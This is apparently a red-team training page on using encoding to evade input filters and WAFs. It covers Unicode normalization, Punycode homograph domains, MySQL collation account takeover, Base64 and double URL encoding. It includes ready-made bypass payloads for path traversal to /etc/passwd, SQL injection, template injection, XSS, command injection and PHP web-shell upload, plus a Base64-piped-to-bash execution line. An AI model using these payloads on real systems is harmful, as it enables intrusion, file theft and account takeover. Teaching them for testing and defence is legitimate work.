---
layout: training-page
title: "Encoding Transformations — Red Team Academy"
module: "Web Hacking"
tags:
  - encoding
  - unicode
  - unicode-normalization
  - base64
  - waf-bypass
  - filter-bypass
  - punycode
page_key: "web-encoding-transformations"
render_with_liquid: false
---

# Encoding Transformations

Encoding and transformation techniques change how data is represented without altering its meaning. Attackers exploit encoding — Unicode normalization, Punycode, Base64, and URL encoding — to bypass input filters, evade WAF rules, and break out of sanitization routines. These techniques are especially effective when the application filters input at one encoding layer but processes it at another after a normalization step.

## Unicode Normalization Attacks

Unicode defines multiple ways to represent visually identical characters. Normalization converts all representations to a single canonical form. The four normalization forms are:

- **NFC** — Canonical Composition: combines decomposed sequences into precomposed characters
- **NFD** — Canonical Decomposition: breaks characters into base + combining marks
- **NFKC** — Compatibility Composition: like NFC, but also replaces compatibility characters (may change appearance)
- **NFKD** — Compatibility Decomposition: like NFD, plus decomposes compatibility characters

The attack vector: inject a Unicode character that passes a filter, but normalizes to a dangerous ASCII character on the server. NFKC/NFKD normalization is particularly powerful because it collapses many "lookalike" characters to their ASCII equivalents.

### Normalization Payload Table

| Character | Unicode | Payload | After Normalization |
| --- | --- | --- | --- |
| Two-dot leader | U+2025 | `‥/‥/‥/etc/passwd` | `../../../etc/passwd` |
| Presentation form full stop | U+FE30 | `︰/︰/︰/etc/passwd` | `../../../etc/passwd` |
| Fullwidth apostrophe | U+FF07 | `＇ or ＇1＇=＇1` | `' or '1'='1` |
| Fullwidth quotation mark | U+FF02 | `＂ or ＂1＂=＂1` | `" or "1"="1` |
| Small hyphen-minus | U+FE63 | `admin'﹣﹣` | `admin'--` |
| Ideographic full stop | U+3002 | `domain。com` | `domain.com` |
| Fullwidth solidus | U+FF0F | `／／domain.com` | `//domain.com` |
| Fullwidth less-than sign | U+FF1C | `＜img src=a＞` | `<img src=a/>` |
| Small left curly bracket | U+FE5B | `﹛﹛3+3﹜﹜` | `{{3+3}}` |
| Fullwidth left square bracket | U+FF3B | `［［5+5］］` | `[[5+5]]` |
| Fullwidth ampersand | U+FF06 | `＆＆whoami` | `&&whoami` |
| Fullwidth letter p | U+FF50 | `shell.ｐʰｐ` | `shell.php` |
| Modifier letter h | U+02B0 | `shell.ｐʰｐ` | `shell.php` |
| Feminine ordinal indicator | U+00AA | `ªdmin` | `admin` |

### Testing Normalization in Python

```
import unicodedata

string = "ᴾᵃʸˡᵒᵃᵈˢ𝓐𝓵𝓵𝕋𝕙𝕖𝒯𝒽𝒾𝓃ℊ𝓈"
print('NFC:  ' + unicodedata.normalize('NFC', string))
print('NFD:  ' + unicodedata.normalize('NFD', string))
print('NFKC: ' + unicodedata.normalize('NFKC', string))
print('NFKD: ' + unicodedata.normalize('NFKD', string))
```

### Common Attack Scenarios

**Path Traversal WAF Bypass** — WAF blocks `../` but the application normalizes Unicode before path resolution:

```
# Using U+2025 (‥) which normalizes to ".."
GET /files/‥/‥/etc/passwd HTTP/1.1
```

**SQL Injection Quote Bypass** — Input filter strips `'` but normalizes Unicode before the SQL query:

```
# Using U+FF07 (＇ fullwidth apostrophe)
username=admin＇ OR ＇1＇=＇1
```

**SSTI via Template Syntax Bypass** — WAF blocks `{{` but normalizes fullwidth brackets:

```
# Using U+FE5B (﹛ small left curly bracket)
input=﹛﹛7*7﹜﹜
```

**File Extension Filter Bypass** — Upload filter blocks `.php` but uses NFKC normalization:

```
# Using fullwidth characters that normalize to ".php"
filename=shell.ｐʰｐ
```

## Punycode Attacks

Punycode encodes Unicode domain names into ASCII-compatible form for use in DNS (Internationalized Domain Names, IDN). Browsers with IDN support display the Unicode form, while the underlying DNS lookup uses Punycode. This enables homograph attacks where visually identical domains resolve to different servers.

### IDN Homograph Example

| Displayed in Browser | Actual DNS (Punycode) | Notes |
| --- | --- | --- |
| `раypal.com` | `xn--ypal-43d9g.com` | Cyrillic 'р' (U+0440) replaces Latin 'p' |
| `paypal.com` | `paypal.com` | Legitimate domain |

Attackers register Punycode domains that look identical to legitimate domains in browsers with IDN support, enabling phishing attacks where the URL appears correct visually.

### MySQL Unicode Collation Bypass

MySQL with certain Unicode collations treats visually similar characters as equal. This can be exploited in password reset, account registration, and OAuth flows:

```
-- MySQL treats 'a' and 'ᵃ' as equal under default utf8mb4 collation
SELECT 'a' = 'ᵃ';
-- Result: 1 (equal)

-- With case-sensitive collation, they are different
SELECT 'a' = 'ᵃ' COLLATE utf8mb4_0900_as_cs;
-- Result: 0 (not equal)
```

**Account Takeover via Password Reset**: Register an account with `ᵃdmin@example.com` (using Unicode superscript 'a'). When the application normalizes the email for lookup, it may match `admin@example.com`. A password reset for the Unicode variant could reset the real admin account.

## Base64 Encoding

Base64 converts binary data into a printable ASCII string using 64 characters (A-Z, a-z, 0-9, +, /). Every 3 input bytes produce 4 output characters. Padding with `=` aligns to a multiple of 3 bytes.

```
# Encode
echo -n admin | base64
# Output: YWRtaW4=

# Decode
echo -n YWRtaW4= | base64 -d
# Output: admin

# Encode arbitrary payload
echo -n '{"role":"admin"}' | base64
# Output: eyJyb2xlIjoiYWRtaW4ifQ==
```

### Base64 in Security Contexts

- **JWT tokens** — header and payload are Base64url encoded (uses `-` and `_` instead of `+` and `/`, no padding)
- **Encoded cookies** — applications sometimes Base64 encode cookie values without signing them — decode to inspect and modify
- **WAF bypass** — some applications decode Base64 before processing, allowing encoded payloads to pass WAF rules
- **Command injection via eval** — execute Base64-encoded commands to avoid character restrictions: `echo "BASE64" | base64 -d | bash`

## URL Encoding Bypasses

Double URL encoding can bypass WAFs that decode input once before checking:

```
# Single encoding — WAF may block
GET /page?input=%3Cscript%3E

# Double encoding — WAF decodes once to %3Cscript%3E (not <script>), passes through
# Application decodes twice: %3Cscript%3E -> <script>
GET /page?input=%253Cscript%253E
```

## Resources

- Unicode Normalization reference table — appcheck-ng.com/wp-content/uploads/unicode_normalization.html
- WAF Bypassing with Unicode Compatibility — Jorge Lajara
- Unicode Normalization Vulnerabilities — Lazar
- Puny-Code, 0-Click Account Takeover — Voorivex
- Unicode Normalization Vulnerabilities & the Special K Polyglot — AppCheck
